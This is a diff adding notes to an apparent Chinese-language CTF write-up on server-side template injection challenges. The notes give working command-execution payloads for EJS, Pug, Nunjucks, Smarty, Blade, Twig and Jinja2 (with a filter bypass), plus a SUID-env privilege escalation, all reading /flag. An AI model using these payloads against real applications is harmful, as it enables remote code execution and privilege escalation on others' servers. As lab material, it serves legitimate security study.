@@ -884,6 +884,8 @@ echo serialize($s);
 
 ## EZSSTI
 
+Node.js 的，`<%= 7*7 %>` 检测返回 49 ，是 EJS 引擎，直接读`<%= global.process.mainModule.require('child_process').execSync('cat /flag') %>`。
+
 
 
 
@@ -892,15 +894,13 @@ echo serialize($s);
 
 ## EZSSTI_1
 
-
-
-
+还是 Node.js ，`#{7*7}` 返回 49 ，是 Pug  引擎，`#{global.process.mainModule.require('child_process').execSync('cat /flag')}` 这里需要查看源代码找到 flag 。
 
 
 
 ## EZSSTI_2
 
-
+是 Nunjucks ，`{{"".constructor.constructor("return this.process.mainModule.require('child_process').execSync('cat /flag').toString()")()}}` 。
 
 
 
@@ -908,7 +908,7 @@ echo serialize($s);
 
 ## EZSSTI_3
 
-
+用 whatweb 看一下是 php 的，测试是 Smarty ，`{system('cat /flag')}` 。
 
 
 
@@ -916,7 +916,7 @@ echo serialize($s);
 
 ## EZSSTI_4
 
-
+还是 php 的，Blade 的，`@php   system("cat /flag"); @endphp` 。
 
 
 
@@ -924,7 +924,7 @@ echo serialize($s);
 
 ## EZSSTI_5
 
-
+还是 php ，Twig 的，`{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("cat /flag")}}` 。
 
 
 
@@ -1080,9 +1080,46 @@ globals  dict(glob=a,al=b)|join
 
 ## EZSSTI_13
 
-`cat /flag` 没结果，但是命令是可以正常执行的，而且 static 目录也进不去。
+`cat /flag` 没结果，但是命令是可以正常执行的，而且 static 目录也进不去。这里卡住了，看了下康可师傅的 wp ，得 suid 提权，同时队友说 env 有个 hint ，看一下。
+
+```txt
+HOSTNAME=29bee48b6372
+OLDPWD=/opt/___web_very_strange_42___
+PORT=80
+HOME=/opt/___web_very_strange_42___
+PYTHONUNBUFFERED=1
+GPG_KEY=A035C8C19219BA821ECEA86B64E628F8D684696D
+PYTHON_SHA256=8d3ed8ec5c88c1c95f5e558612a725450d2452813ddad5e58fdb1a53b1209b78
+WERKZEUG_SERVER_FD=3
+PYTHONDONTWRITEBYTECODE=1
+HINT=用我提个权吧
+PATH=/usr/local/bin:/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+LANG=C.UTF-8
+PYTHON_VERSION=3.11.14
+PWD=/opt/___web_very_strange_42___
+```
 
 
+
+再结合康可的 wp ，预期解应该是 env 后看到提示，然后想到 suid 提权，然后用`/usr/local/bin/env`提权。
+
+先找一下可以用来提权的。
+
+`{{url_for[dict(__glob=a,als__=b)|join]['os'].popen('find / -perm -4000 -type f 2>/dev/null').read()}}`。
+
+```txt
+/usr/bin/mount
+/usr/bin/gpasswd
+/usr/bin/su
+/usr/bin/chsh
+/usr/bin/newgrp
+/usr/bin/chfn
+/usr/bin/umount
+/usr/bin/passwd
+/usr/local/bin/env
+```
+
+正好就有`/usr/local/bin/env`，所以`{{url_for[dict(__glob=a,als__=b)|join]['os'].popen('/usr/local/bin/env cat /flag').read()}}`。
 
 
 
